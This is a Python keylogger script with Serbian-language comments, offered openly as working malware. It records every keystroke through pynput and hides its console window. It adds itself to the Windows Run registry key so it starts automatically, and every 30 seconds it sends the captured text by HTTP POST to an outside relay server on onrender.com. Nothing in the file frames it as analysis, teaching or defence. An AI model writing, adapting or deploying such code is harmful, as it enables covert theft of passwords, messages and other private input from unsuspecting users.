import os
import sys
import threading
import time
import requests
from pynput import keyboard

# ----- KONFIGURACIJA -----
# 🔁 OBAVEZNO: Zameni sa URL-om tvog servera na Renderu!
SERVER_URL = "https://keylogger-relay-1.onrender.com/log"  # Npr. https://keylogger-relay.onrender.com/log
SEND_INTERVAL = 30  # Šalje svakih 30 sekundi

log_buffer = ""
buffer_lock = threading.Lock()
shift_pressed = False  # Dodato za praćenje Shift tastera

def on_press(key):
    global log_buffer, shift_pressed

    try:
        # Ako je key.char dostupan (obično slovo, broj, znak)
        char = key.char
        if char is not None:
            # Ako je Shift pritisnut, pretvori u veliko slovo (ako je slovo)
            if shift_pressed and char.isalpha():
                char = char.upper()
            log_buffer += char
            return
    except AttributeError:
        pass  # Nema key.char, znači specijalni taster

    # Specijalni tasteri
    special = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.delete: "[DELETE]",
        keyboard.Key.shift_l: None,      # Ne dodajemo u log, samo mijenjamo stanje
        keyboard.Key.shift_r: None,
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.cmd: "[WIN]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
    }

    # Ažuriranje stanja Shift tastera
    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = True
        return  # Ne dodajemo u log
    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        # Ovo je već obrađeno, ali dodajemo i otpuštanje? Ne, ovdje je on_press.
        # Za otpuštanje bi trebalo on_release, ali za jednostavnost,
        # resetujemo shift_pressed tek kada se pusti Shift. Radi tačnosti,
        # bolje je dodati i on_release. Dodajemo ispod.
        pass

    # Dodaj u log ako nije None
    rep = special.get(key)
    if rep is not None:
        log_buffer += rep

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = False

def send_to_server(data):
    """Šalje logove na tvoj server na Renderu"""
    try:
        response = requests.post(SERVER_URL, data=data, timeout=10)
        if response.status_code == 200:
            print(f"✓ Poslato {len(data)} karaktera")
        else:
            print(f"✗ Server greška: {response.status_code}")
    except Exception as e:
        print(f"✗ Neuspešno slanje: {e}")

def periodic_sender():
    global log_buffer
    while True:
        time.sleep(SEND_INTERVAL)
        if log_buffer:
            with buffer_lock:
                to_send = log_buffer
                log_buffer = ""
            threading.Thread(target=send_to_server, args=(to_send,), daemon=True).start()

def hide_console():
    if sys.platform == "win32" and getattr(sys, 'frozen', False):
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup():
    """Dodaje program u Windows autostart"""
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        winreg.SetValueEx(handle, "KeyloggerRelay", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(handle)
        print("✓ Program dodat u autostart")
    except Exception as e:
        print(f"✗ Nije moguće dodati u autostart: {e}")

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.daemon = True
    listener.start()
    print("✓ Keylogger listener pokrenut")
    
    sender_thread = threading.Thread(target=periodic_sender, daemon=True)
    sender_thread.start()
    print(f"✓ Slanje na server svakih {SEND_INTERVAL} sekundi")
    
    print("Keylogger je aktivan.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Gašenje keyloggera...")
